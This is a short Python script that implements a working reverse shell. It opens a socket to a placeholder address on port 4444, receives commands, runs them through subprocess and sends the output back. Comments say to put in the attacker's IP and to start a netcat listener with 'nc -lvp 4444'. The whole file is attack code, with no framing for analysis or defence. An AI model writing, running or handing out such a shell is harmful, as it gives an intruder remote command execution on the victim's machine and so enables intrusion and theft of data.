import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("victim_ip_address", 4444))  # Replace with the attackers IP address and port
    #Attack needs to have netcat listing on port 4444 (command = nc -lvp 4444)
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    s.close()

if __name__ == "__main__":
    connect()
